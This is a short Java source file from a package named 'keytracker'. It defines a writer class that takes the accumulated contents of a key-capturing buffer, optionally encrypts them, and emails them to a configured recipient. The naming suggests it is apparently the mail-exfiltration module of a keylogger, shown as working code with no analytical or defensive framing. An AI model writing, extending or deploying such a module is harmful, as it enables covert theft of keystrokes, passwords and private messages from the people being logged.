package com.keytracker.file;

import com.keytracker.KeyAppender;
import com.keytracker.encrypt.Encryptor;
import com.keytracker.mail.MailSender;

public class MyMailWriter implements Writer {
    private final MailSender mailSender;
    private String to;

    public MyMailWriter(MailSender mailSender, String to) {
        this.mailSender = mailSender;
        this.to = to;
    }

    @Override
    public void write(KeyAppender keyAppender, Encryptor encryptor) {
        String value = retrieveValue(keyAppender, encryptor);
        mailSender.send(value, to);
    }

    private String retrieveValue(KeyAppender keyAppender, Encryptor encryptor) {
        return encryptor != null ? encryptor.encrypt(keyAppender.value()) : keyAppender.value();
    }
}